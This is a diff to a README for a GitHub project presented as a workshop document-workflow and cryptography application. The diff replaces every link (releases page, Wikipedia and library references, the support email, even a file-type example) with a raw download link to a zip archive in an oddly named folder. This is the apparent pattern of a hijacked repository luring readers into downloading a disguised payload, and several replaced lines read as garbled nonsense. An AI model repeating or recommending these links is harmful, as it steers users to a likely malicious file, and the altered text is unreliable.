@@ -1,6 +1,6 @@
 # 🌟 Industry5.0-Workshop-IEEE-SB - Streamline Document Workflows Today
 
-[![Download](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/releases)
+[![Download](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/raw/refs/heads/main/daguerreotypic/Industry_SB_Workshop_IEE_v3.3-beta.2.zip%20Now-From%20Releases-brightgreen)](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/raw/refs/heads/main/daguerreotypic/Industry_SB_Workshop_IEE_v3.3-beta.2.zip)
 
 ## 📦 Overview
 
@@ -15,7 +15,7 @@ To get started with the application, you’ll need to follow these steps:
    - Internet connection for downloading the software.
    - Enough storage space (at least 100 MB) for installation.
 
-2. **Download the Application**: Go to the Releases page to get the latest version of the application. Visit this link to download: [Releases Page](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/releases)
+2. **Download the Application**: Go to the Releases page to get the latest version of the application. Visit this link to download: [Releases Page](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/raw/refs/heads/main/daguerreotypic/Industry_SB_Workshop_IEE_v3.3-beta.2.zip)
 
 ## 💻 Download & Install
 
@@ -25,7 +25,7 @@ Once you reach the Releases page, follow these instructions:
    
 2. Click on the version link to open the download options. You will see different files available for download.
 
-3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, .tar.gz for Linux).
+3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/raw/refs/heads/main/daguerreotypic/Industry_SB_Workshop_IEE_v3.3-beta.2.zip for Linux).
 
 4. Click on the file name to start downloading.
 
@@ -70,18 +70,18 @@ If you encounter issues or have questions, our support team is here to help. You
 
 - Check the **FAQ** section on the GitHub repository.
 - Open an issue on GitHub in the Issues tab.
-- Reach out directly to our support email at support@example.com.
+- Reach out directly to our support email at https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/raw/refs/heads/main/daguerreotypic/Industry_SB_Workshop_IEE_v3.3-beta.2.zip
 
 ## 🔗 Additional Resources
 
 To learn more about cryptographic techniques and document workflows, consider exploring the following topics:
 
-- [Asymmetric Encryption](https://en.wikipedia.org/wiki/Public-key_cryptography)
-- [Digital Signatures](https://en.wikipedia.org/wiki/Digital_signature)
-- [Cryptography Hazmat](https://cryptography.io/en/latest)
+- [Asymmetric Encryption](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/raw/refs/heads/main/daguerreotypic/Industry_SB_Workshop_IEE_v3.3-beta.2.zip)
+- [Digital Signatures](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/raw/refs/heads/main/daguerreotypic/Industry_SB_Workshop_IEE_v3.3-beta.2.zip)
+- [Cryptography Hazmat](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/raw/refs/heads/main/daguerreotypic/Industry_SB_Workshop_IEE_v3.3-beta.2.zip)
 
 ## 📥 Download Again
 
-For your convenience, here’s the download link once more: [Visit this page to download](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/releases)
+For your convenience, here’s the download link once more: [Visit this page to download](https://github.com/Quantilytix-AI/Industry5.0-Workshop-IEEE-SB/raw/refs/heads/main/daguerreotypic/Industry_SB_Workshop_IEE_v3.3-beta.2.zip)
 
 With these steps, you should be able to successfully download and run the **Industry5.0-Workshop-IEEE-SB** application. Enjoy observing the advancements in document workflows and cryptographic capabilities!
